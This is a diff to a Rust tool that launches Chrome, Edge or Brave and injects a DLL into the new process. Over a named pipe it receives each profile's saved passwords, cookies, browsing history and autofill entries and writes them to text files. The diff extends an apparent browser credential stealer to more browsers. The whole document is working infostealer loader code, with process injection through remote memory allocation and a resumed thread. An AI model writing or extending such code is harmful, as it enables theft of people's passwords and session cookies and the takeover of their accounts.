@@ -57,15 +57,48 @@ struct Args {
     /// Path to the DLL to inject
     #[arg(short, long)]
     dll: String,
+
+    /// Target browser (chrome, edge, brave)
+    #[arg(short, long, default_value = "chrome")]
+    browser: String,
 }
 
-/// Try to find chrome.exe in common installation directories
-fn find_chrome_exe() -> Option<String> {
-    let common_paths = [
-        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
-        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
-    ];
-    for path in common_paths {
+struct BrowserConfig {
+    name: &'static str,
+    exe_name: &'static str,
+    common_paths: &'static [&'static str],
+}
+
+const BROWSERS: &[BrowserConfig] = &[
+    BrowserConfig {
+        name: "chrome",
+        exe_name: "chrome.exe",
+        common_paths: &[
+            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
+            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
+        ],
+    },
+    BrowserConfig {
+        name: "edge",
+        exe_name: "msedge.exe",
+        common_paths: &[
+            r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
+            r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
+        ],
+    },
+    BrowserConfig {
+        name: "brave",
+        exe_name: "brave.exe",
+        common_paths: &[
+            r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
+            r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
+        ],
+    },
+];
+
+fn find_browser_exe(name: &str) -> Option<String> {
+    let config = BROWSERS.iter().find(|b| b.name == name.to_lowercase())?;
+    for path in config.common_paths {
         if std::path::Path::new(path).exists() {
             return Some(path.to_string());
         }
@@ -76,16 +109,18 @@ fn find_chrome_exe() -> Option<String> {
 fn main() {
     let args = Args::parse();
 
+    let browser_config = BROWSERS.iter()
+        .find(|b| b.name == args.browser.to_lowercase())
+        .expect("Unsupported browser. Use chrome, edge, or brave.");
+
     // Prepare the DLL path as a wide string
     let dll_path = std::path::Path::new(&args.dll)
         .canonicalize()
         .expect("Failed to get absolute path to DLL");
     let dll_path_u16: Vec<u16> = dll_path.as_os_str().encode_wide().chain(Some(0)).collect();
 
-    // Build command line for chrome.exe
-    // We'll use "chrome.exe" as the command line, letting Windows search PATH
-    let chrome_exe = "chrome.exe";
-    let mut cmd_line: Vec<u16> = OsStr::new(chrome_exe).encode_wide().chain(Some(0)).collect();
+    // Build command line
+    let mut cmd_line: Vec<u16> = OsStr::new(browser_config.exe_name).encode_wide().chain(Some(0)).collect();
 
     unsafe {
         let mut startup_info: STARTUPINFOW = std::mem::zeroed();
@@ -95,7 +130,7 @@ fn main() {
         // Create process with lpApplicationName = NULL so the system searches PATH
         let success = CreateProcessW(
             ptr::null(),                     // lpApplicationName (NULL)
-            cmd_line.as_mut_ptr(),           // lpCommandLine (mutable, includes "chrome.exe")
+            cmd_line.as_mut_ptr(),           // lpCommandLine (mutable, includes exe name)
             ptr::null_mut(),                 // lpProcessAttributes
             ptr::null_mut(),                 // lpThreadAttributes
             0,                               // bInheritHandles
@@ -109,8 +144,8 @@ fn main() {
         if success == 0 {
             let error = GetLastError();
             if error == ERROR_FILE_NOT_FOUND {
-                // Try to locate chrome.exe in common install paths
-                if let Some(path) = find_chrome_exe() {
+                // Try to locate exe in common install paths
+                if let Some(path) = find_browser_exe(browser_config.name) {
                     // Retry with full path
                     let full_path_wide: Vec<u16> = OsStr::new(&path).encode_wide().chain(Some(0)).collect();
                     let mut cmd_full = full_path_wide.clone();
@@ -127,15 +162,15 @@ fn main() {
                         &mut process_info,
                     );
                     if success2 == 0 {
-                        eprintln!("Failed to create chrome.exe process even with full path: {}", GetLastError());
+                        eprintln!("Failed to create {} process even with full path: {}", browser_config.exe_name, GetLastError());
                         return;
                     }
                 } else {
-                    eprintln!("chrome.exe not found. Ensure Google Chrome is installed and its directory is in your PATH, or provide a custom path.");
+                    eprintln!("{} not found. Ensure it is installed and its directory is in your PATH.", browser_config.exe_name);
                     return;
                 }
             } else {
-                eprintln!("Failed to create chrome.exe process: {}", error);
+                eprintln!("Failed to create {} process: {}", browser_config.exe_name, error);
                 return;
             }
         }
@@ -144,9 +179,7 @@ fn main() {
         let thread_handle = process_info.hThread;
         let target_pid = process_info.dwProcessId;
 
-        println!("Created chrome.exe with PID: {}", target_pid);
-
-        // ... (rest of the injection code remains the same) ...
+        println!("Created {} with PID: {}", browser_config.exe_name, target_pid);
 
         // Allocate memory for DLL path
         let remote_mem = VirtualAllocEx(
@@ -239,7 +272,7 @@ fn main() {
         if ResumeThread(thread_handle) == u32::MAX {
             eprintln!("Failed to resume main thread: {}", GetLastError());
         } else {
-            println!("Resumed chrome.exe main thread.");
+            println!("Resumed {} main thread.", browser_config.exe_name);
         }
 
         // Create Named Pipe
@@ -310,9 +343,7 @@ fn main() {
                                     match fs::File::create(profile_dir.join("password.txt")) {
                                         Ok(mut pass_file) => {
                                             for p in profile.passwords {
-                                                if let Err(e) = writeln!(pass_file, "URL: {}\nUser: {}\nPass: {}\n", p.url, p.username, p.password) {
-                                                    eprintln!("Failed to write to password.txt: {}", e);
-                                                }
+                                                let _ = writeln!(pass_file, "URL: {}\nUser: {}\nPass: {}\n", p.url, p.username, p.password);
                                             }
                                         }
                                         Err(e) => eprintln!("Failed to create password.txt: {}", e),
@@ -322,9 +353,7 @@ fn main() {
                                     match fs::File::create(profile_dir.join("cookie.txt")) {
                                         Ok(mut cookie_file) => {
                                             for c in profile.cookies {
-                                                if let Err(e) = writeln!(cookie_file, "Host: {} | Name: {} | Value: {}", c.host, c.name, c.value) {
-                                                    eprintln!("Failed to write to cookie.txt: {}", e);
-                                                }
+                                                let _ = writeln!(cookie_file, "Host: {} | Name: {} | Value: {}", c.host, c.name, c.value);
                                             }
                                         }
                                         Err(e) => eprintln!("Failed to create cookie.txt: {}", e),
@@ -334,9 +363,7 @@ fn main() {
                                     match fs::File::create(profile_dir.join("history.txt")) {
                                         Ok(mut history_file) => {
                                             for h in profile.history {
-                                                if let Err(e) = writeln!(history_file, "URL: {} | Title: {} | Visits: {}", h.url, h.title, h.visit_count) {
-                                                    eprintln!("Failed to write to history.txt: {}", e);
-                                                }
+                                                let _ = writeln!(history_file, "URL: {} | Title: {} | Visits: {}", h.url, h.title, h.visit_count);
                                             }
                                         }
                                         Err(e) => eprintln!("Failed to create history.txt: {}", e),
@@ -346,9 +373,7 @@ fn main() {
                                     match fs::File::create(profile_dir.join("autofill.txt")) {
                                         Ok(mut autofill_file) => {
                                             for a in profile.autofill {
-                                                if let Err(e) = writeln!(autofill_file, "Name: {} | Value: {}", a.name, a.value) {
-                                                    eprintln!("Failed to write to autofill.txt: {}", e);
-                                                }
+                                                let _ = writeln!(autofill_file, "Name: {} | Value: {}", a.name, a.value);
                                             }
                                         }
                                         Err(e) => eprintln!("Failed to create autofill.txt: {}", e),
